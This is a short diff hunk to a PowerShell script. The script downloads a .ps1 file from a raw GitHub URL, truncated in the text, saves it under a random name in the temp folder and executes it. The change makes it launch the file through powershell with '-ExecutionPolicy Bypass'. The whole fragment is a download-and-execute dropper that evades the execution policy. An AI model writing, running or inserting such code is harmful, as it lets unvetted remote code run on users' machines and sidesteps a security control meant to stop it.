@@ -2,4 +2,4 @@ $url = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/mai
 $rand = [System.IO.Path]::GetRandomFileName() + ".ps1"
 $output = Join-Path $env:TEMP $rand
 Invoke-WebRequest -Uri $url -OutFile $output
-& $output
+Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$output`""
